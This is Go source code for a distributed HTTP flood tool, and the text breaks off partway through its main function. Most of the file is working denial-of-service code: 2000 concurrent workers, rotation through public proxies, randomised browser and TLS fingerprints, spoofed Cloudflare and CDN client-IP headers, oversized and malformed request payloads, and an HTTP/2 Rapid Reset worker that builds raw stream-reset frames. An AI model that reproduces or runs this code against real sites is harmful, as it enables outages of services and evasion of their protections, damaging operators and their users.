package main

import (
	"crypto/rand"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"math/big"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
	
	// ADDED: For HTTP/2 support
	"golang.org/x/net/http2"
)

var (
	userAgents = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
		// ADDED: More user agents from Python file
		"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 13.5; rv:109.0) Gecko/20100101 Firefox/120.0",
		"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/120.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
		"Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
		"facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
		"Twitterbot/1.0",
	}
	
	referers = []string{
		"https://www.google.com/",
		"https://www.bing.com/",
		"https://duckduckgo.com/",
		"https://facebook.com/",
		// ADDED: More referers from Python file
		"https://www.reddit.com/",
		"https://www.youtube.com/",
		"https://www.linkedin.com/",
		"https://www.instagram.com/",
		"https://www.tiktok.com/",
		"https://discord.com/",
		"https://web.whatsapp.com/",
		"https://mail.google.com/",
		"https://drive.google.com/",
		"https://github.com/",
		"https://stackoverflow.com/",
		"https://www.amazon.com/",
		"",
	}
	
	// ADDED: Accept languages from Python file
	acceptLanguages = []string{
		"en-US,en;q=0.9",
		"en-GB,en;q=0.8",
		"fr-FR,fr;q=0.9,en;q=0.8",
		"de-DE,de;q=0.9,en;q=0.8",
		"es-ES,es;q=0.9,en;q=0.8",
		"pt-BR,pt;q=0.9,en;q=0.8",
		"it-IT,it;q=0.9,en;q=0.8",
		"ja-JP,ja;q=0.9,en;q=0.8",
		"ko-KR,ko;q=0.9,en;q=0.8",
		"zh-CN,zh;q=0.9,en;q=0.8",
		"ru-RU,ru;q=0.9,en;q=0.8",
	}
	
	// ADDED: Accept headers from Python file
	acceptHeaders = []string{
		"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"application/json, text/plain, */*",
		"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
		"*/*",
		"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
	}
	
	// ADDED: Accept encodings from Python file
	acceptEncodings = []string{
		"gzip, deflate, br",
		"gzip, deflate",
		"identity",
		"gzip;q=1.0, deflate;q=0.9, br;q=0.8",
		"*;q=0.1",
	}
	
	// ADDED: Cache control headers from Python file
	cacheControls = []string{
		"no-cache",
		"no-store",
		"must-revalidate",
		"max-age=0",
		"private",
		"public",
		"no-transform",
		"proxy-revalidate",
		"s-maxage=0",
	}
	
	// ADDED: Security headers from Python file
	securityHeaders = []map[string]string{
		{"X-Content-Type-Options": "nosniff"},
		{"X-Frame-Options": "DENY"},
		{"X-Frame-Options": "SAMEORIGIN"},
		{"X-XSS-Protection": "1; mode=block"},
		{"Strict-Transport-Security": "max-age=31536000; includeSubDomains"},
		{"Referrer-Policy": "no-referrer"},
		{"Referrer-Policy": "strict-origin-when-cross-origin"},
		{"Referrer-Policy": "same-origin"},
	}
	
	// ADDED: Modern browser headers from Python file
	modernHeaders = []map[string]string{
		{"Sec-Fetch-Dest": "document"},
		{"Sec-Fetch-Dest": "empty"},
		{"Sec-Fetch-Dest": "script"},
		{"Sec-Fetch-Dest": "style"},
		{"Sec-Fetch-Dest": "image"},
		{"Sec-Fetch-Dest": "font"},
		{"Sec-Fetch-Dest": "worker"},
		{"Sec-Fetch-Mode": "navigate"},
		{"Sec-Fetch-Mode": "cors"},
		{"Sec-Fetch-Mode": "no-cors"},
		{"Sec-Fetch-Mode": "same-origin"},
		{"Sec-Fetch-Site": "same-origin"},
		{"Sec-Fetch-Site": "cross-site"},
		{"Sec-Fetch-Site": "none"},
		{"Sec-Fetch-User": "?1"},
		{"Upgrade-Insecure-Requests": "1"},
		{"DNT": "0"},
		{"DNT": "1"},
	}
	
	// ADDED: Cloudflare IP ranges for spoofing
	cloudflareIPRanges = [][]string{
		{"173.245.48", "173.245.63"},
		{"103.21.244", "103.21.247"},
		{"141.101.64", "141.101.127"},
		{"108.162.192", "108.162.255"},
		{"104.16.0", "104.23.255"},
		{"172.64.0", "172.71.255"},
	}
	
	// ADDED: Provider-specific headers
	cloudflareHeaders = []map[string]string{
		{"CF-Connecting-IP": ""}, // Value will be generated
		{"CF-IPCountry": "US"},
		{"CF-IPCountry": "GB"},
		{"CF-IPCountry": "DE"},
		{"CF-IPCountry": "FR"},
		{"CF-IPCountry": "CA"},
		{"CF-IPCountry": "AU"},
		{"CF-IPCountry": "JP"},
		{"CF-IPCountry": "SG"},
		{"True-Client-IP": ""}, // Value will be generated
	}
	
	hetznerHeaders = []map[string]string{
		{"X-Client-IP": ""},
		{"X-Cluster-Client-IP": ""},
		{"X-Hetzner-DataCenter": "FSN1-DC1"},
	}
	
	digitaloceanHeaders = []map[string]string{
		{"X-Forwarded-Host": ""},
		{"X-Forwarded-Port": "80"},
		{"X-Forwarded-Port": "443"},
		{"X-Forwarded-Port": "8080"},
	}
	
	awsHeaders = []map[string]string{
		{"X-Amz-Cf-Id": ""},
		{"X-Amz-Cf-Pop": "DFW"},
		{"X-Amz-Cf-Pop": "LHR"},
		{"X-Amz-Cf-Pop": "SIN"},
		{"X-Amz-Cf-Pop": "NRT"},
		{"X-Amz-Cf-Pop": "SYD"},
		{"Via": "1.1 amazon.cloudfront.net"},
	}
	
	// ADDED: Application headers
	appHeaders = []map[string]string{
		{"X-Requested-With": "XMLHttpRequest"},
		{"X-Requested-With": "Fetch"},
		{"X-CSRF-Token": ""}, // Value will be generated
		{"Authorization": "Bearer "}, // Value will be generated
		{"X-API-Key": ""}, // Value will be generated
		{"X-Device-ID": ""}, // Value will be generated
		{"X-Session-ID": ""}, // Value will be generated
	}
	
	// ADDED: CDN headers
	cdnHeaders = []map[string]string{
		{"X-CDN": "Cloudflare"},
		{"X-CDN": "Akamai"},
		{"X-CDN": "Fastly"},
		{"X-CDN": "CloudFront"},
		{"X-CDN": "MaxCDN"},
		{"X-Edge-Location": "DFW"},
		{"X-Edge-Location": "LHR"},
		{"X-Edge-Location": "SIN"},
		{"X-Edge-Location": "NRT"},
		{"X-Edge-Location": "SYD"},
		{"X-Edge-Location": "GRU"},
		{"Via": "1.1 varnish"},
		{"X-Cache": "MISS"},
		{"X-Cache": "HIT"},
	}
	
	// ADDED: TLS profiles for fingerprint randomization
	tlsProfiles = []*tls.Config{
		{
			// Chrome 120 profile
			NextProtos:         []string{"h2", "http/1.1"},
			InsecureSkipVerify: true,
			MinVersion:         tls.VersionTLS12,
			MaxVersion:         tls.VersionTLS13,
			CipherSuites: []uint16{
				tls.TLS_AES_128_GCM_SHA256,
				tls.TLS_AES_256_GCM_SHA384,
				tls.TLS_CHACHA20_POLY1305_SHA256,
				tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
				tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
				tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
				tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
				tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
				tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
			},
			CurvePreferences: []tls.CurveID{
				tls.X25519,
				tls.CurveP256,
				tls.CurveP384,
			},
		},
		{
			// Firefox 120 profile
			NextProtos:         []string{"h2", "http/1.1"},
			InsecureSkipVerify: true,
			MinVersion:         tls.VersionTLS12,
			MaxVersion:         tls.VersionTLS13,
			CipherSuites: []uint16{
				tls.TLS_AES_128_GCM_SHA256,
				tls.TLS_CHACHA20_POLY1305_SHA256,
				tls.TLS_AES_256_GCM_SHA384,
				tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
				tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
				tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
				tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
				tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
				tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			},
			CurvePreferences: []tls.CurveID{
				tls.X25519,
				tls.CurveP256,
				tls.CurveP384,
				tls.CurveP521,
			},
		},
	}
	
	proxies         []string
	proxyMu         sync.RWMutex
	proxyIndex      uint64
	proxyAPI        = "https://api.proxyscrape.com/v4/free-proxy-list/get?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all&skip=0&limit=2000"
	refreshInterval = 5 * time.Minute
	colorIndex      = 0
	colorMu         sync.Mutex
)

// ADDED: Protocol detection result
type protocolInfo struct {
	protocol string // "h1", "h2", "h3"
	supported bool
}

// ADDED: Detect supported protocols
func detectProtocols(target string) []string {
	u, err := url.Parse(target)
	if err != nil {
		return []string{"h1"}
	}
	
	host := u.Hostname()
	port := u.Port()
	if port == "" {
		if u.Scheme == "https" {
			port = "443"
		} else {
			port = "80"
		}
	}
	
	detected := make(map[string]bool)
	
	// Try HTTP/2 and HTTP/1.1 via TLS
	if u.Scheme == "https" {
		conn, err := tls.Dial("tcp", host+":"+port, &tls.Config{
			NextProtos:         []string{"h2", "http/1.1"},
			InsecureSkipVerify: true,
		})
		if err == nil {
			defer conn.Close()
			if conn.ConnectionState().NegotiatedProtocol == "h2" {
				detected["h2"] = true
			} else {
				detected["h1"] = true
			}
		}
	}
	
	// Try HTTP/1.1 fallback
	client := &http.Client{
		Timeout: 3 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	
	resp, err := client.Get(target)
	if err == nil {
		defer resp.Body.Close()
		if resp.ProtoMajor == 2 {
			detected["h2"] = true
		} else {
			detected["h1"] = true
		}
	}
	
	// Check for HTTP/3 via Alt-Svc
	req, _ := http.NewRequest("HEAD", target, nil)
	resp, err = client.Do(req)
	if err == nil {
		altSvc := resp.Header.Get("Alt-Svc")
		if strings.Contains(altSvc, "h3") {
			detected["h3"] = true
		}
	}
	
	// Default to h1 if nothing detected
	if len(detected) == 0 {
		detected["h1"] = true
	}
	
	result := make([]string, 0, len(detected))
	for proto := range detected {
		result = append(result, proto)
	}
	return result
}

// ADDED: Get random TLS profile
func getRandomTLSProfile() *tls.Config {
	idx := randInt(0, len(tlsProfiles)-1)
	return tlsProfiles[idx]
}

// ADDED: HTTP/2 Rapid Reset attack worker
func rapidResetWorker(targetURL string, done chan struct{}, stats *atomicCounter) {
	u, _ := url.Parse(targetURL)
	host := u.Hostname()
	port := u.Port()
	if port == "" {
		if u.Scheme == "https" {
			port = "443"
		} else {
			port = "80"
		}
	}
	
	for {
		select {
		case <-done:
			return
		default:
			// Create new connection for each batch
			conn, err := tls.Dial("tcp", host+":"+port, getRandomTLSProfile())
			if err != nil {
				time.Sleep(100 * time.Millisecond)
				continue
			}
			
			// HTTP/2 connection preface
			fmt.Fprintf(conn, "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n")
			
			// Send multiple rapid reset streams
			for i := 0; i < 50; i++ {
				select {
				case <-done:
					conn.Close()
					return
				default:
					// Create HTTP/2 frame header for HEADERS frame
					frameHeader := make([]byte, 9)
					payloadLen := 50 // Random payload length
					frameHeader[0] = byte(payloadLen >> 16)
					frameHeader[1] = byte(payloadLen >> 8)
					frameHeader[2] = byte(payloadLen)
					frameHeader[3] = 0x01 // HEADERS frame type
					frameHeader[4] = 0x20 // END_HEADERS flag
					
					// Stream ID (odd for client-initiated)
					streamID := uint32(i*2 + 1)
					frameHeader[5] = byte(streamID >> 24)
					frameHeader[6] = byte(streamID >> 16)
					frameHeader[7] = byte(streamID >> 8)
					frameHeader[8] = byte(streamID)
					
					// Write frame header
					conn.Write(frameHeader)
					
					// Write compressed headers (simplified)
					headers := []byte{
						0x82, 0x86, // :method: GET
						0x84, 0x8a, 0x08, 0x2f, // :path: /
					}
					conn.Write(headers)
					
					stats.inc()
					
					// Immediately reset the stream (RAPID RESET!)
					resetFrame := make([]byte, 13)
					resetFrame[0] = 0
					resetFrame[1] = 0
					resetFrame[2] = 0
					resetFrame[3] = 4
					resetFrame[4] = 0x03 // RST_STREAM frame
					resetFrame[5] = 0
					resetFrame[6] = 0
					resetFrame[7] = 0
					resetFrame[8] = byte(streamID)
					resetFrame[9] = 0
					resetFrame[10] = 0
					resetFrame[11] = 0
					resetFrame[12] = 0x08 // CANCEL error code
					
					conn.Write(resetFrame)
					
					// Very small delay to prevent overwhelming local system
					time.Sleep(1 * time.Millisecond)
				}
			}
			conn.Close()
		}
	}
}

func loadProxiesFromAPI() {
	resp, err := http.Get(proxyAPI)
	if err != nil {
		fmt.Printf("[-] Error fetching proxies: %v\n", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		fmt.Printf("[-] ProxyScrape returned %d\n", resp.StatusCode)
		return
	}

	body, _ := io.ReadAll(resp.Body)
	lines := strings.Split(string(body), "\n")

	newProxies := []string{}
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line != "" && strings.Contains(line, ":") && !strings.HasPrefix(line, "#") {
			newProxies = append(newProxies, line)
		}
	}

	proxyMu.Lock()
	proxies = newProxies
	proxyMu.Unlock()

	atomic.StoreUint64(&proxyIndex, 0)
	fmt.Printf("[+] Loaded/Refreshed %d proxies from ProxyScrape\n", len(proxies))
}

func proxyRefresher() {
	ticker := time.NewTicker(refreshInterval)
	defer ticker.Stop()
	for range ticker.C {
		loadProxiesFromAPI()
	}
}

func getNextProxy() string {
	proxyMu.RLock()
	n := len(proxies)
	if n == 0 {
		proxyMu.RUnlock()
		return ""
	}
	idx := atomic.AddUint64(&proxyIndex, 1) % uint64(n)
	p := proxies[idx]
	proxyMu.RUnlock()
	return p
}

func getNextColor() string {
	colorMu.Lock()
	defer colorMu.Unlock()
	
	colors := []string{
		"\033[32m", // Green
		"\033[31m", // Red
		"\033[35m", // Violet/Magenta
		"\033[37m", // White
		"\033[33m", // Yellow
		"\033[36m", // Cyan
		"\033[34m", // Blue
	}
	
	color := colors[colorIndex]
	colorIndex = (colorIndex + 1) % len(colors)
	return color
}

func printBanner() {
	color := getNextColor()
	fmt.Print(color)
	fmt.Println("  .88888.    .88888.  ")
	fmt.Println(" d8'   `88  d8'   `8b ")
	fmt.Println(" 88        88       88 ")
	fmt.Println(" 88   YP88 88       88 ")
	fmt.Println(" Y8.   .88  Y8.   .8P ")
	fmt.Println("  `88888'    `8888P'  ")
	fmt.Println("\033[0m")
}

// ADDED: Generate Cloudflare IP for spoofing
func generateCloudflareIP() string {
	cfRange := cloudflareIPRanges[randInt(0, len(cloudflareIPRanges)-1)]
	ipParts := strings.Split(cfRange[0], ".")
	return fmt.Sprintf("%s.%s.%d.%d", ipParts[0], ipParts[1], randInt(0, 255), randInt(1, 254))
}

// ADDED: Generate random hex string
func randomHex(n int) string {
	bytes := make([]byte, n)
	rand.Read(bytes)
	return hex.EncodeToString(bytes)
}

// ADDED: Generate random base64 string
func randomBase64(n int) string {
	bytes := make([]byte, n)
	rand.Read(bytes)
	return base64.StdEncoding.EncodeToString(bytes)
}

// ADDED: Generate UUID-like string
func generateUUID() string {
	return fmt.Sprintf("%s-%s-%s-%s-%s",
		randomHex(4),
		randomHex(2),
		randomHex(2),
		randomHex(2),
		randomHex(6))
}

// ADDED: Generate realistic cookies (FIXED: removed unused cookieTypes variable)
func generateCookies() string {
	cookies := []string{}
	
	// Session cookies
	if randBool() {
		cookies = append(cookies, fmt.Sprintf("session_id=%s", randomBase64(24)))
	}
	if randBool() {
		cookies = append(cookies, fmt.Sprintf("user_token=%s", randomHex(32)))
	}
	if randBool() {
		cookies = append(cookies, fmt.Sprintf("csrf_token=%s", randomBase64(16)))
	}
	if randBool() {
		cookies = append(cookies, fmt.Sprintf("auth_token=%s", randomHex(16)))
	}
	if randBool() {
		cookies = append(cookies, fmt.Sprintf("user_id=%d", randInt(1000, 99999)))
	}
	
	// Preference cookies
	langs := []string{"en", "fr", "de", "es", "pt", "it", "ja", "ko", "zh", "ru"}
	themes := []string{"light", "dark", "auto"}
	currencies := []string{"USD", "EUR", "GBP", "JPY", "CAD", "AUD"}
	
	if randBool() {
		cookies = append(cookies, fmt.Sprintf("lang=%s", langs[randInt(0, len(langs)-1)]))
	}
	if randBool() {
		cookies = append(cookies, fmt.Sprintf("theme=%s", themes[randInt(0, len(themes)-1)]))
	}
	if randBool() {
		cookies = append(cookies, fmt.Sprintf("currency=%s", currencies[randInt(0, len(currencies)-1)]))
	}
	
	// Analytics cookies
	if randBool() {
		cookies = append(cookies, fmt.Sprintf("_ga=GA1.1.%d.%d", randInt(1000000000, 9999999999), int(time.Now().Unix())))
	}
	if randBool() {
		cookies = append(cookies, fmt.Sprintf("_gid=GA1.1.%d.%d", randInt(1000000000, 9999999999), int(time.Now().Unix())))
	}
	if randBool() {
		cookies = append(cookies, fmt.Sprintf("__cfduid=%s%d", randomHex(16), int(time.Now().Unix())))
	}
	
	if len(cookies) == 0 {
		return ""
	}
	
	return strings.Join(cookies, "; ")
}

// ADDED: Detect provider based on IP
func detectProvider(ip string) string {
	if strings.HasPrefix(ip, "104.") || strings.HasPrefix(ip, "172.") || strings.HasPrefix(ip, "173.") {
		return "cloudflare"
	} else if strings.HasPrefix(ip, "136.") || strings.HasPrefix(ip, "138.") || strings.HasPrefix(ip, "148.") {
		return "hetzner"
	} else if strings.HasPrefix(ip, "159.") || strings.HasPrefix(ip, "167.") || strings.HasPrefix(ip, "198.") {
		return "digitalocean"
	} else if strings.HasPrefix(ip, "52.") || strings.HasPrefix(ip, "54.") || strings.HasPrefix(ip, "18.") {
		return "aws"
	}
	
	// Random for others
	providers := []string{"cloudflare", "hetzner", "digitalocean", "aws"}
	return providers[randInt(0, len(providers)-1)]
}

// ADDED: Generate request body for POST
func generateRequestBody() string {
	bodyType := randInt(1, 3)
	
	switch bodyType {
	case 1: // JSON
		data := map[string]interface{}{
			"username":  fmt.Sprintf("user%d", randInt(1000, 9999)),
			"password":  randomBase64(16),
			"email":     fmt.Sprintf("user%d@example.com", randInt(100, 999)),
			"data":      randomBase64(randInt(50, 500)),
			"timestamp": time.Now().UnixNano() / int64(time.Millisecond),
			"token":     randomHex(32),
			"action":    []string{"login", "register", "update", "delete", "search"}[randInt(0, 4)],
		}
		jsonBytes, _ := json.Marshal(data)
		return string(jsonBytes)
		
	case 2: // Form
		fields := []string{
			fmt.Sprintf("username=user%d", randInt(1000, 9999)),
			fmt.Sprintf("password=%s", randomBase64(12)),
			fmt.Sprintf("email=test%d@example.com", randInt(100, 999)),
			fmt.Sprintf("csrf_token=%s", randomBase64(16)),
		}
		return strings.Join(fields[0:randInt(2, 4)], "&")
		
	default: // XML
		return fmt.Sprintf(`<?xml version="1.0"?><request><user>test%d</user><action>ping</action></request>`, randInt(100, 999))
	}
}

func generateAdvancedPath() string {
	if randInt(1, 100) <= 30 {
		depth := randInt(2, 6)
		path := ""
		for i := 0; i < depth; i++ {
			path += randomString(randInt(4, 12)) + "/"
		}
		if randBool() {
			extensions := []string{".php", ".html", ".jsp", ".asp", ".aspx"}
			path = strings.TrimSuffix(path, "/") + extensions[randInt(0, len(extensions)-1)]
		}
		return "/" + path
	}

	if randInt(1, 100) <= 20 {
		malforms := []string{
			"/" + randomString(4) + "/../" + randomString(4),
			"/./" + randomString(6) + "/..",
			"//" + randomString(8),
			"/%2e%2e%2f" + randomString(4),
			"/" + randomString(4) + "%00" + randomString(4),
		}
		return malforms[randInt(0, len(malforms)-1)]
	}
	
	// ADDED: More path variations
	paths := []string{
		"/", "/index.html", "/home", "/main", "/default", "/welcome",
		"/api/v1/users", "/api/v1/data", "/api/v2/info", "/api/v3/status",
		"/wp-admin", "/admin", "/login", "/dashboard", "/control-panel",
		"/static/css/main.css", "/static/js/app.js", "/static/images/logo.png",
		"/images/logo.png", "/favicon.ico", "/robots.txt", "/sitemap.xml",
		"/.env", "/config.json", "/api.json", "/manifest.json",
		"/graphql", "/rest/v1", "/oauth2/authorize", "/oauth2/token",
		"/health", "/status", "/metrics", "/debug", "/test",
	}
	
	if randInt(1, 100) <= 70 {
		return paths[randInt(0, len(paths)-1)]
	}

	return "/"
}

func generateCacheBustParams() string {
	styles := []string{
		"?v=" + strconv.Itoa(randInt(1, 1000000)),
		"?_=" + strconv.FormatInt(time.Now().UnixNano(), 10),
		"?rnd=" + randomString(16),
		"?cachebuster=" + randomString(8),
		"?" + randomString(4) + "=" + randomString(6) + "&" + randomString(5) + "=" + randomString(8),
		"?utm_source=" + randomString(6) + "&utm_medium=" + randomString(5) + "&utm_campaign=" + randomString(8),
		"?sessionid=" + randomString(32),
		"?PHPSESSID=" + randomString(26),
		"?jsessionid=" + randomString(24),
		func() string {
			numParams := randInt(5, 15)
			params := "?"
			for i := 0; i < numParams; i++ {
				params += randomString(randInt(3, 8)) + "=" + randomString(randInt(5, 20))
				if i < numParams-1 {
					params += "&"
				}
			}
			return params
		}(),
	}
	return styles[randInt(0, len(styles)-1)]
}

func generatePostPayload() (string, string) {
	payloadSizes := []int{1024, 2048, 4096, 8192, 16384, 32768}
	size := payloadSizes[randInt(0, len(payloadSizes)-1)]

	payloadType := randInt(1, 5)

	switch payloadType {
	case 1:
		numFields := randInt(5, 20)
		payload := ""
		for i := 0; i < numFields; i++ {
			fieldName := randomString(randInt(4, 10))
			fieldValue := randomString(size/numFields + randInt(1, 100))
			payload += fieldName + "=" + fieldValue
			if i < numFields-1 {
				payload += "&"
			}
		}
		return payload, "application/x-www-form-urlencoded"

	case 2:
		json := `{"data":"` + strings.Repeat("A", size/4) + `","recursive":{"level1":{"level2":{"level3":{"level4":"` +
			randomString(size/4) + `"}}}},"array":[` + strings.Repeat(`"`+randomString(20)+`",`, 50) + `"end"]}`
		return json, "application/json"

	case 3:
		xml := `<?xml version="1.0"?><data>` +
			strings.Repeat("<item><name>"+randomString(20)+"</name><value>"+randomString(30)+"</value></item>", size/100) +
			`</data>`
		return xml, "application/xml"

	case 4:
		boundary := "----WebKitFormBoundary" + randomString(16)
		filename := randomString(10) + []string{".jpg", ".pdf", ".zip", ".txt", ".exe"}[randInt(0, 4)]
		fileContent := strings.Repeat("FILEDATA", size/8)

		payload := fmt.Sprintf(
			"--%s\r\n"+
				"Content-Disposition: form-data; name=\"file\"; filename=\"%s\"\r\n"+
				"Content-Type: %s\r\n\r\n%s\r\n"+
				"--%s\r\n"+
				"Content-Disposition: form-data; name=\"submit\"\r\n\r\n"+
				"Upload\r\n--%s--\r\n",
			boundary,
			filename,
			[]string{"image/jpeg", "application/pdf", "application/zip", "text/plain", "application/octet-stream"}[randInt(0, 4)],
			fileContent,
			boundary,
			boundary,
		)
		return payload, "multipart/form-data; boundary=" + boundary

	case 5:
		patterns := []string{
			"q=" + strings.Repeat("%", 50) + randomString(20) + "%",
			"search=" + randomString(10) + "*",
			"filter=" + strings.Repeat("1 OR ", 20) + "1=1",
			"start_date=1900-01-01&end_date=2099-12-31",
			"page=" + strconv.Itoa(randInt(10000, 1000000)) + "&limit=100",
			"sort=" + strings.Repeat(randomString(5)+",", 20) + randomString(5),
		}
		payload := patterns[randInt(0, len(patterns)-1)]
		return payload + "&extra=" + randomString(size-len(payload)), "application/x-www-form-urlencoded"
	}

	return randomString(size), "application/x-www-form-urlencoded"
}

func main() {
	runtime.GOMAXPROCS(runtime.NumCPU() * 4)

	useProxy := len(os.Args) >= 5

	if useProxy {
		loadProxiesFromAPI()
		if len(proxies) > 0 {
			go proxyRefresher()
		} else {
			fmt.Println("[-] No Proxy Detected, Running Without Proxy")
			useProxy = false
		}
	}

	if len(os.Args) < 4 {
		printBanner()
		fmt.Println("Usage: go run main.go <target> <seconds> <GET|POST|HEAD|SLOW> [proxy]")
		fmt.Println("   [proxy] → optional if you want to use proxy")
		os.Exit(1)
	}

	target := os.Args[1]
	durStr := os.Args[2]
	mode := strings.ToUpper(os.Args[3])

	if mode != "GET" && mode != "POST" && mode != "HEAD" && mode != "SLOW" {
		printBanner()
		fmt.Println("Mode GET, POST, HEAD, and SLOW ")
		os.Exit(1)
	}

	u, err := url.Parse(target)
	if err != nil || u.Scheme == "" || u.Host == "" {
		if strings.Contains(target, ":") && !strings.Contains(target, "://") {
			target = "http://" + target
		} else if !strings.HasPrefix(target, "http") {
			target = "https://" + target
		}
		u, err = url.Parse(target)
		if err != nil {
			fmt.Println("Invalid target URL:", err)
			os.Exit(1)
		}
	}

	durationSec, err := strconv.Atoi(durStr)
	if err != nil {
		fmt.Println("Invalid duration:", err)
		os.Exit(1)
	}
	duration := time.Duration(durationSec) * time.Second

	// ADDED: Auto-detect protocols
	fmt.Printf("[+] Auto-detecting supported protocols for %s...\n", target)
	protocols := detectProtocols(target)
	fmt.Printf("[+] Detected protocols: %s\n", strings.Join(protocols, ", "))

	printBanner()
	fmt.Printf("[+] Target: %s\n", target)
	fmt.Printf("[+] Mode: %s\n", mode)
	fmt.Printf("[+] Duration: %d sec\n", durationSec)
	fmt.Printf("[+] Workers: 2000\n")
	fmt.Printf("[+] Detected Protocols: %s\n", strings.Join(protocols, ", "))
	if useProxy && len(proxies) > 0 {
		fmt.Printf("[+] Proxies: %d (rotating + refresh every %.0f min)\n", len(proxies), refreshInterval.Minutes())
	}
	fmt.Println("[+] Starting... Ctrl+C to stop")

	var wg sync.WaitGroup
	done := make(chan struct{})
	stats := &atomicCounter{}
	startTime := time.Now()

	go func() {
		time.Sleep(duration)
		close(done)
	}()

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sig
		close(done)
	}()

	// ADDED: Check if target supports HTTP/2 for Rapid Reset
	h2Supported := false
	for _, p := range protocols {
		if p == "h2" {
			h2Supported = true
			break
		}
	}

	const workers = 2000
	
	// ADDED: If HTTP/2 is supported, use 25% of workers for Rapid Reset
	if h2Supported && mode == "GET" {
		rapidWorkers := workers / 2
		normalWorkers := workers - rapidWorkers
		
		fmt.Printf("[+] HTTP/2 detected! Using %d workers for Rapid Reset attack\n", rapidWorkers)
		fmt.Printf("[+] %d workers for normal flood\n", normalWorkers)
		
		// Start Rapid Reset workers
		for i := 0; i < rapidWorkers; i++ {
			wg.Add(1)
			go func(id int) {
				defer wg.Done()
				rapidResetWorker(target, done, stats)
			}(i)
		}
		
		// Start normal flood workers
		for i := 0; i < normalWorkers; i++ {
			wg.Add(1)
			go func(id int) {
				defer wg.Done()
				attackWorker(target, u.Host, mode, done, stats, useProxy)
			}(i)
		}
	} else {
		// Normal flood only
		for i := 0; i < workers; i++ {
			wg.Add(1)
			go func(id int) {
				defer wg.Done()
				attackWorker(target, u.Host, mode, done, stats, useProxy)
			}(i)
		}
	}

	go func() {
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-done:
				clearScreen()
				fmt.Printf("[+] Attack completed!\n")
				fmt.Printf("Target: %s\n", target)
				fmt.Printf("Mode: %s\n", mode)
				fmt.Printf("Duration: %d sec\n", durationSec)
				fmt.Printf("Total requests/streams: %d\n", stats.get())
				fmt.Printf("Average RPS: %.0f\n", float64(stats.get())/duration.Seconds())
				fmt.Printf("Elapsed time: %.0f sec\n", time.Since(startTime).Seconds())
				return
			case <-ticker.C:
				clearScreen()
				printBanner()
				
				elapsed := time.Since(startTime).Seconds()
				rps := float64(stats.get()) / elapsed
				fmt.Printf("[+] Target: %s\n", target)
				fmt.Printf("[+] Mode: %s\n", mode)
				fmt.Printf("[+] Detected Protocols: %s\n", strings.Join(protocols, ", "))
				fmt.Printf("[+] Elapsed: %.0f / %d sec\n", elapsed, durationSec)
